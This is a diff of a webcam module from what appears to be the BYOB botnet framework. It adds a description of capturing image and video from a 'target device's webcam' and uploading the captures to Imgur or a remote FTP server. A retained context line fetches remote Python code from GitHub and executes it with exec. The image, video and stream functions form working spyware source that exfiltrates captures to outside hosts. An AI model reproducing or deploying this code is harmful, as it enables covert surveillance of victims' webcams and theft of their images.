@@ -18,12 +18,15 @@ exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/mas
 sys.modules['util'] = util
 
 # globals
+command = True
+results = {}
 packages  = ['cv2']
 platforms = ['win32','linux2','darwin']
-
-# setup
-util.is_compatible(platforms, __name__)
-util.imports(packages, __builtins__)
+usage = 'webcam <imgur/ftp>'
+description = """ 
+Capture image/video from target device's webcam and
+optionally upload it to Imgur or a remote FTP server
+"""
 
 # main
 def image(*args, **kwargs):
@@ -38,7 +41,6 @@ def image(*args, **kwargs):
         return util.imgur(png) if 'ftp' not in args else util.ftp(png, filetype='.png')
     except Exception as e:
         return '{} error: {}'.format(image.func_name, str(e))
-
 
 def video(*args, **kwargs):
     try:
@@ -60,7 +62,6 @@ def video(*args, **kwargs):
         return result
     except Exception as e:
         return '{} error: {}'.format(video.func_name, str(e))
-
 
 def stream(port=None, retries=5):
     try:
